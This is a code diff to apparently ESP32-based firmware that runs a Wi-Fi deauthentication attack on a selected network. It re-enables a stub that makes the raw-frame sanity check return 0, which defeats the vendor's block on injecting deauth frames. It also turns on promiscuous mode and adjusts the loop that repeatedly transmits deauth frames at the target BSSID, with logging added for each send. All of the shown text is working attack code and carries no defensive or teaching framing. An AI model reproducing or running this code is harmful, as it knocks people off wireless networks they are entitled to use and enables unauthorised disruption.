@@ -9,9 +9,9 @@ deauth_frame_t deauth_frame;
 int deauth_type = DEAUTH_TYPE_SINGLE;
 int eliminated_stations;
 
-/*extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
   return 0;
-}*/
+}
 
 esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
@@ -65,14 +65,19 @@ void start_deauth(int wifi_number, uint16_t reason) {
 
   String ssid = WiFi.SSID(wifi_number);
   String bssid = WiFi.BSSIDstr(wifi_number);
+  int sta_num = WiFi.softAPgetStationNum();
 
   Serial.println("Starting Deauth-Attack on network " + ssid + " with BSSID " + bssid);
 
   // Configure the deauth frame
   configure_deauth_frame(wifi_number, reason);
 
+  wifi_mode_t mode;
+  esp_wifi_get_mode(&mode);
+  Serial.printf("Current Wi-Fi mode: %d\n", mode);
+
   // Keep the web server running by avoiding promiscuous mode
-  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous(true);
   xTaskCreatePinnedToCore(
     [](void *param) {
       while (deauth_type == DEAUTH_TYPE_SINGLE) {
@@ -81,10 +86,13 @@ void start_deauth(int wifi_number, uint16_t reason) {
             Serial.println("ERR: NO VALID INTERFACE FOR WIFI");
             break;
           }
-          if(!interfaceAP) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
-          else esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
+          esp_err_t result;
+          if(interfaceAP) result = esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
+          else result = esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
+          if(result == ESP_OK) Serial.println("Deauth frame sent successfully.");
+          else Serial.println("Failed to send deauth frame.");
         }
-        vTaskDelay(pdMS_TO_TICKS(100)); // Delay between frame bursts
+        vTaskDelay(pdMS_TO_TICKS(500)); // Delay between frame bursts
       }
       vTaskDelete(NULL);
     },
